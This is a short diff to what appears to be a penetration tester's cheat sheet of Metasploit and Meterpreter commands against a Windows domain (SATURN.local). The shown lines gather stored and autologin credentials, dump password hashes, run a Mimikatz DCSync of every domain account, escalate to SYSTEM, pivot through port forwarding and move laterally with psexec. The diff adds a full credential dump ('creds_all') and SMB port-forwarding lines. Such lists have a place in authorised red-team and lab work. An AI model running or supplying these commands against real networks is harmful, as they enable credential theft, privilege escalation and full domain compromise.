@@ -470,6 +470,7 @@ run post/windows/gather/credentials/enum_cred_store
 run post/windows/gather/credentials/gpp
 run post/windows/gather/credentials/windows_autologin
 hashdump
+creds_all
 kiwi_cmd "lsadump::dcsync /domain:SATURN.local /all /csv"
 getsystem
 cp /root/Tools/Inf/privilege-escalation-awesome-scripts-suite/metasploit/peass.rb /usr/share/metasploit-framework/modules/post/multi/gather/
@@ -539,6 +540,11 @@ Set-DomainObject -Identity $USERNAME -SET @{serviceprincipalname='SET/SET'}; Get
 run post/multi/manage/autoroute
 run post/multi/manage/autoroute ACTION=delete
 run auxiliary/scanner/netbios/nbname RHOSTS=10.10.10.0/24
+
+portfwd add -l 445 -r 10.10.10.1 -p 445
+portfwd list
+portfwd flush
+
 use exploit/windows/smb/psexec
 set LHOST 10.10.10.3
 set RHOSTS 10.10.10.1-2
